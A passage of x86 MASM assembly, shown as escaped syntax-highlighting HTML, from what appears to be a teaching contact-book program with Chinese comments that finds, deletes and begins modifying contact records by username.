	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jnb&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;同上&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;比较&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;和&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;里存的字符串&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;repe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmpsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;不相等就进入下一次循环&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;相等就打印信息&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;保存&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;恢复&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;输出&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_show_content&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;恢复&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;end_for&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;结束循环&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szFindNoone&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;end_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;FindData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;


&lt;span class=&quot;nx&quot;&gt;DelData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印提示信息&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szDelWho&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取输入的用户名&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;查询该用户的序号&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jnb&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;同上&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;比较&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;和&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;里存的字符串&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;repe&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cmpsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;不相等就进入下一次循环&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;相等&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;，&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;就是该用户的序号&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;del_process&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;结束循环&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;next_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szFindNoone&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit_prog&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;del_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;将序号后的字节都前移&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;TeleContacts&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取目的地址&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ebx&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取源地址&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;（&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;目的地址后一个&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;）&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;计算拷贝数量&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;find_i&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;需要前移的字节&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;循环前移&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;把&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SI&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;所指地址的一个字节搬移到&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DI&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;所指的地址上&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;rep&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;movsb&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;总数&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;成功删除&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szDelSuccess&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;exit_prog&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;DelData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;endp&lt;/span&gt;


&lt;span class=&quot;nx&quot;&gt;ModifyData&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;proc&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;打印提示信息&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;szModify&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_printf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;获取输入的用户名&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str_format_str&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crt_scanf&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;查询该用户的序号&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;start_for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jnb&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;info_output&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;同上&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Contact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;imul&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;edx&lt;/span&gt;
